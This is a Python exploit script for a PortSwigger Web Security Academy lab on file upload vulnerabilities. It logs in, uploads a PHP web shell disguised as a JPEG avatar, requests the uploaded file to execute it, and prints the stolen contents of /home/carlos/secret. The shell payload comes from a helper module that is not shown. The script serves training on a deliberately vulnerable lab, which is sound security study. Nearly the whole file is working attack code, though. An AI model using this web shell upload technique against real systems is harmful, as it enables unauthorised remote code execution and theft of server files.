# Lab 01 — Remote code execution via web shell upload
# PortSwigger: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
#
# Vulnerability: The avatar upload feature performs NO validation
#                whatsoever on the uploaded file
# Aim:           Upload a basic PHP web shell and exfiltrate
#                /home/carlos/secret
#
# Technique:
#   Upload a plain .php file directly as the avatar — no bypass needed.
#
# Usage: python file_upload_lab01.py <url>

import sys
import urllib3
from proxies import proxies
from file_upload_utils import (banner, section, make_session, login,
                                PHP_PAYLOAD, upload_avatar, find_avatar_url,
                                check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 01 — RCE VIA WEB SHELL UPLOAD, NO DEFENCES")

    if len(sys.argv) != 2:
        print("  Usage: python file_upload_lab01.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    print("\n  ── Step 1: upload a plain PHP web shell as the avatar\n")
    r_upload = upload_avatar(session, url, "exploit.php", PHP_PAYLOAD, content_type="image/jpeg")
    check_status(r_upload, [200, 302], "Upload exploit.php")

    print("\n  ── Step 2: locate the uploaded file's URL\n")
    avatar_path = find_avatar_url(session, url) or "/files/avatars/exploit.php"
    print(f"  ➜  Avatar path: {avatar_path}\n")

    print("  ── Step 3: request the uploaded file to trigger execution\n")
    r_exec = session.get(f"{url}{avatar_path}")
    check_status(r_exec, 200, f"GET {avatar_path}")

    print_box("LEAKED SECRET", r_exec.text.strip())

    print()
    print("  ℹ  No validation existed at all — the PHP executed immediately")
    print("     once requested. Every other lab in this module builds on")
    print("     this exact exploit, adding one defence to bypass at a time.")
